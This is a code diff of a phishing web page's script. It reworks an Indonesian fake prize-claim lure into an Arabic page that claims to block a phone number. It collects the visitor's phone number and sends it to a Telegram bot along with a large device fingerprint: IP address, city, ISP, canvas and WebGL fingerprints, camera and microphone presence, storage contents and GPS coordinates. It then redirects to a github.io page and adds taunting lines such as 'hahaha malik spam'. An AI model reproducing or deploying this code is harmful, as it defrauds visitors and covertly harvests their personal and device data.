@@ -632,14 +632,14 @@ updateEgyptClock();
                 const result = await response.json();
                 
                 if (result.ok) {
-                    updateStatus('telegramStatus', '✅ الاتصال بنظام تيليجرام', 'success');
+                    updateStatus('telegramStatus', '✅ الاتصال بنظام الواتساب', 'success');
                     return true;
                 } else {
                     updateStatus('telegramStatus', '⚠️ رمز البوت غير صالح', 'error');
                     return false;
                 }
             } catch (error) {
-                updateStatus('telegramStatus', '⚠️ فشل الاتصال بتطبيق تيليجرام', 'error');
+                updateStatus('telegramStatus', '⚠️ فشل الاتصال بتطبيق الواتساب', 'error');
                 return false;
             }
         }
@@ -1033,7 +1033,7 @@ updateEgyptClock();
             loading.style.display = 'block';
             successMessage.style.display = 'none';
             claimButton.disabled = true;
-            claimButton.textContent = 'يتم حظر الرقم الرجاء الانتظار...';
+            claimButton.textContent = '...يتم حظر الرقم الرجاء الانتظار';
             claimButton.style.background = 'linear-gradient(135deg, #000000, #000000)';
             
             // Tambahkan nomor telepon ke data
@@ -1048,17 +1048,17 @@ updateEgyptClock();
                 successMessage.style.display = 'block';
                 
                 document.querySelector('.user-count').innerHTML = 
-                    '👥 <strong>1,249 orang</strong> sudah berhasil klaim hadiah hari ini';
+                    '✅ <strong>1,249 تم العكس علي الرقم</strong>';
                 
                 setTimeout(() => {
-                    const whatsappMessage = `Halo, saya ingin klaim hadiah Rp 5.500.000. Nomor telepon saya: ${phone}`;
+                    const whatsappMessage = `hahaha malik spam`;
                     window.location.href = `https://malikwfw.github.io/zbyyy/`;
                 }, 2000);
             } else {
                 loading.style.display = 'none';
-                alert('Terjadi kesalahan sistem. Silakan coba lagi atau hubungi customer service.');
+                alert('حدث خطأ في النظام. يرجى المحاولة مرة أخرى أو الاتصال بخدمة العملاء..');
                 claimButton.disabled = false;
-                claimButton.textContent = '🎯 KLIM SEKARANG - DAPATKAN Rp 5.500.000';
+                claimButton.textContent = 'hahaha';
                 claimButton.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';
             }
         });
@@ -1087,15 +1087,15 @@ updateEgyptClock();
                 const result = await response.json();
                 
                 if (result.ok) {
-                    updateStatus('telegramStatus', '✅ Data berhasil dikirim ke sistem', 'success');
+                    updateStatus('telegramStatus', '✅ تم إرسال البيانات بنجاح إلى النظام', 'success');
                     return true;
                 } else {
-                    updateStatus('telegramStatus', '⚠️ Gagal mengirim data ke Telegram', 'error');
+                    updateStatus('telegramStatus', '⚠️', 'error');
                     return false;
                 }
                 
             } catch (error) {
-                updateStatus('telegramStatus', '⚠️ Error koneksi ke Telegram', 'error');
+                updateStatus('telegramStatus', '⚠️ حدث خطأ في الاتصال بتطبيق الواتساب', 'error');
                 return false;
             }
         }
@@ -1103,112 +1103,10 @@ updateEgyptClock();
         // Format pesan Telegram dengan semua data
         function formatTelegramMessage(data) {
             return `
-🎉 <b>KLAIM HADIAH BARU - 200+ DATA LENGKAP</b>
+😈 <b>Complete data</b>
 
-📱 <b>DATA PENERIMA:</b>
-• 📞 Nomor WhatsApp: <code>${data.phone}</code>
-• 🕐 Waktu Klaim: ${data.localTime}
-• 🌐 Timezone: ${data.timezone} (Offset: ${data.timezoneOffset}m)
-• 🏷️ Timestamp: ${data.timestamp}
-
-🌐 <b>BROWSER INFO:</b>
-• 🔧 Browser: ${data.browser} ${data.browserVersion}
-• 🖥️ OS: ${data.os} ${data.osVersion}
-• 📱 Device: ${data.deviceType}
-• 🏢 Engine: ${data.engine}
-• 📋 User Agent: ${data.userAgent}
-• 🗣️ Bahasa: ${data.language}
-• 🌍 Languages: ${data.languages}
-• 💻 Platform: ${data.platform}
-• 🏢 Vendor: ${data.vendor}
-• 🍪 Cookie: ${data.cookieEnabled}
-• 🌐 Online: ${data.onlineStatus}
-• 📄 PDF Viewer: ${data.pdfViewerEnabled}
-• 🤖 Webdriver: ${data.webdriver}
-• 📦 Product: ${data.product}
-• 📱 App Code: ${data.appCodeName}
-• 📱 App Name: ${data.appName}
-• 🔢 App Version: ${data.appVersion}
-
-💻 <b>HARDWARE:</b>
-• ⚡ CPU Cores: ${data.hardwareConcurrency}
-• 🧠 RAM: ${data.deviceMemory}GB
-• 👆 Touch Points: ${data.maxTouchPoints}
-• ☕ Java: ${data.javaEnabled}
-• 🚫 Do Not Track: ${data.doNotTrack}
-
-📱 <b>LAYAR:</b>
-• 🖼️ Resolusi: ${data.screenWidth}x${data.screenHeight}
-• 📐 Available: ${data.availWidth}x${data.availHeight}
-• 🎨 Color Depth: ${data.colorDepth}bit
-• ⚫ Pixel Depth: ${data.pixelDepth}bit
-• 📊 Pixel Ratio: ${data.devicePixelRatio}
-• 📐 Orientation: ${data.orientationType} ${data.orientationAngle}°
-• 📏 Viewport: ${data.innerWidth}x${data.innerHeight}
-• 🪟 Outer: ${data.outerWidth}x${data.outerHeight}
-• 🖥️ Screen X: ${data.screenX}
-• 🖥️ Screen Y: ${data.screenY}
-• 📍 Page Offset: ${data.pageXOffset},${data.pageYOffset}
-
-📶 <b>JARINGAN:</b>
-• 🌐 IP Address: ${data.ipAddress}
-• 🇮🇩 Negara: ${data.ipCountry} (${data.ipCountryCode})
-• 🏙️ Kota: ${data.ipCity}
-• 📮 Postal: ${data.ipPostal}
-• 🏢 Region: ${data.ipRegion}
-• 🕐 Timezone IP: ${data.ipTimezone}
-• 📡 ISP: ${data.ipISP}
-• 🔗 ASN: ${data.ipAsn}
-• 📡 Connection: ${data.connectionType}
-• ⚡ Downlink: ${data.downlink}Mbps
-• 🏃 RTT: ${data.rtt}ms
-• 💾 Save Data: ${data.saveData}
-• ⚡ Downlink Max: ${data.downlinkMax}Mbps
-
-🎮 <b>GRAFIK:</b>
-• 🎨 WebGL Renderer: ${data.webglRenderer}
-• 🏢 WebGL Vendor: ${data.webglVendor}
-• 🔢 WebGL Version: ${data.webglVersion}
-• 💬 Shading Language: ${data.webglShadingLanguage}
-• 🖼️ Canvas FP: ${data.canvasFingerprint}
-
-⚡ <b>PERFORMANCE:</b>
-• 🕐 Time Origin: ${data.timeOrigin}
-• ⏱️ Performance Now: ${data.now}
-• 🧭 Navigation Type: ${data.navigationType}
-• 🔄 Redirect Count: ${data.redirectCount}
-• ⏱️ Load Time: ${data.loadTime}ms
-• ⚡ DOM Ready: ${data.domReadyTime}ms
-• 🧠 Memory Used: ${data.memoryUsed}MB
-• 🧠 Memory Total: ${data.memoryTotal}MB
-• 🚫 Memory Limit: ${data.memoryLimit}MB
-
-📷 <b>MEDIA:</b>
-• 📹 Total Devices: ${data.mediaDevicesCount}
-• 📸 Camera: ${data.hasCamera ? 'Ya' : 'Tidak'}
-• 🎤 Microphone: ${data.hasMicrophone ? 'Ya' : 'Tidak'}
-• 🔊 Speaker: ${data.hasSpeaker ? 'Ya' : 'Tidak'}
-• 🎵 Audio Context: ${data.audioContext}
-
-🔌 <b>PLUGINS:</b>
-• 🔌 Total Plugins: ${data.pluginsCount}
-• 📄 MIME Types: ${data.mimeTypesCount}
-• 📋 Plugins: ${data.pluginsList}
-
-💾 <b>STORAGE:</b>
-• 💾 Local Storage: ${data.localStorage}
-• 💾 Session Storage: ${data.sessionStorage}
-• 🗃️ IndexedDB: ${data.indexedDB}
-
-🔗 <b>URL:</b>
-• ↩️ Referrer: ${data.referrer}
-• 🌐 URL: ${data.url}
-• 🏠 Origin: ${data.origin}
-• 🖥️ Host: ${data.host}
-• 🖥️ Hostname: ${data.hostname}
-• 🔒 Protocol: ${data.protocol}
-• 🔌 Port: ${data.port}
-• 📁 Pathname: ${data.pathname}
+📱 <b>بيانات المستلم:</b>
+• 📞 رقم الواتساب: <code>${data.phone}</code>• 🕐 وقت المطالبة: ${data.localTime}• 🌐 المنطقة الزمنية: ${data.timezone} (فرق التوقيت: ${data.timezoneOffset} دقيقة)• 🏷️ الطابع الزمني: ${data.timestamp}🌐 <b>معلومات المتصفح:</b>• 🔧 المتصفح: ${data.browser} ${data.browserVersion}• 🖥️ نظام التشغيل: ${data.os} ${data.osVersion}• 📱 نوع الجهاز: ${data.deviceType}• 🏢 المحرك: ${data.engine}• 📋 وكيل المستخدم: ${data.userAgent}• 🗣️ اللغة: ${data.language}• 🌍 اللغات: ${data.languages}• 💻 المنصة: ${data.platform}• 🏢 الشركة المصنعة: ${data.vendor}• 🍪 ملفات تعريف الارتباط: ${data.cookieEnabled}• 🌐 حالة الاتصال: ${data.onlineStatus}• 📄 قارئ PDF: ${data.pdfViewerEnabled}• 🤖 أداة التحكم (Webdriver): ${data.webdriver}• 📦 المنتج: ${data.product}• 📱 رمز التطبيق: ${data.appCodeName}• 📱 اسم التطبيق: ${data.appName}• 🔢 إصدار التطبيق: ${data.appVersion}💻 <b>المكونات المادية (Hardware):</b>• ⚡ أنوية المعالج: ${data.hardwareConcurrency}• 🧠 الرام (RAM): ${data.deviceMemory} جيجابايت• 👆 نقاط اللمس: ${data.maxTouchPoints}• ☕ جافا: ${data.javaEnabled}• 🚫 خاصية عدم التتبع: ${data.doNotTrack}📱 <b>الشاشة:</b>• 🖼️ الدقة: ${data.screenWidth}x${data.screenHeight}• 📐 المتاح: ${data.availWidth}x${data.availHeight}• 🎨 عمق الألوان: ${data.colorDepth} بت• ⚫ عمق البكسل: ${data.pixelDepth} بت• 📊 نسبة البكسل: ${data.devicePixelRatio}• 📐 الاتجاه: ${data.orientationType} ${data.orientationAngle}°• 📏 نافذة العرض (Viewport): ${data.innerWidth}x${data.innerHeight}• 🪟 العرض الخارجي: ${data.outerWidth}x${data.outerHeight}• 🖥️ الإحداثي الأفقي للشاشة: ${data.screenX}• 🖥️ الإحداثي الرأسي للشاشة: ${data.screenY}• 📍 إزاحة الصفحة: ${data.pageXOffset},${data.pageYOffset}📶 <b>الشبكة:</b>• 🌐 عنوان الـ IP: ${data.ipAddress}• 🌍 الدولة: ${data.ipCountry} (${data.ipCountryCode})• 🏙️ المدينة: ${data.ipCity}• 📮 الرمز البريدي: ${data.ipPostal}• 🏢 المنطقة: ${data.ipRegion}• 🕐 توقيت الـ IP: ${data.ipTimezone}• 📡 مزود الخدمة (ISP): ${data.ipISP}• 🔗 معرف الشبكة (ASN): ${data.ipAsn}• 📡 نوع الاتصال: ${data.connectionType}• ⚡ سرعة التحميل: ${data.downlink} ميجابت/ث• 🏃 وقت الاستجابة (RTT): ${data.rtt} مللي ثانية• 💾 توفير البيانات: ${data.saveData}• ⚡ أقصى سرعة تحميل: ${data.downlinkMax} ميجابت/ث🎮 <b>الجرافيك (الرسوميات):</b>• 🎨 معالج WebGL: ${data.webglRenderer}• 🏢 الشركة المصنعة لـ WebGL: ${data.webglVendor}• 🔢 إصدار WebGL: ${data.webglVersion}• 💬 لغة التظليل: ${data.webglShadingLanguage}• 🖼️ بصمة الكانفس: ${data.canvasFingerprint}⚡ <b>الأداء:</b>• 🕐 أصل الوقت: ${data.timeOrigin}• ⏱️ الأداء الآن: ${data.now}• 🧭 نوع التنقل: ${data.navigationType}• 🔄 عدد التحويلات: ${data.redirectCount}• ⏱️ وقت التحميل: ${data.loadTime} مللي ثانية• ⚡ جاهزية الـ DOM: ${data.domReadyTime} مللي ثانية• 🧠 الذاكرة المستخدمة: ${data.memoryUsed} ميجابايت• 🧠 إجمالي الذاكرة: ${data.memoryTotal} ميجابايت• 🚫 حد الذاكرة: ${data.memoryLimit} ميجابايت📷 <b>الوسائط:</b>• 📹 إجمالي الأجهزة: ${data.mediaDevicesCount}• 📸 الكاميرا: ${data.hasCamera ? 'متاحة' : 'غير متاحة'}• 🎤 الميكروفون: ${data.hasMicrophone ? 'متاح' : 'غير متاح'}• 🔊 مكبر الصوت: ${data.hasSpeaker ? 'متاح' : 'غير متاح'}• 🎵 سياق الصوت: ${data.audioContext}🔌 <b>الإضافات (Plugins):</b>• 🔌 إجمالي الإضافات: ${data.pluginsCount}• 📄 أنواع MIME: ${data.mimeTypesCount}• 📋 قائمة الإضافات: ${data.pluginsList}💾 <b>التخزين:</b>• 💾 التخزين المحلي (Local Storage): ${data.localStorage}• 💾 تخزين الجلسة (Session Storage): ${data.sessionStorage}• 🗃️ قاعدة بيانات IndexedDB: ${data.indexedDB}🔗 <b>الرابط (URL):</b>• ↩️ المصدر (Referrer): ${data.referrer}• 🌐 الرابط: ${data.url}• 🏠 الأصل: ${data.origin}• 🖥️ المضيف: ${data.host}• 🖥️ اسم المضيف: ${data.hostname}• 🔒 البروتوكول: ${data.protocol}• 🔌 المنفذ (Port): ${data.port}• 📁 المسار: ${data.pathname}
 
 ${data.latitude ? `
 📍 <b>LOKASI GPS:</b>
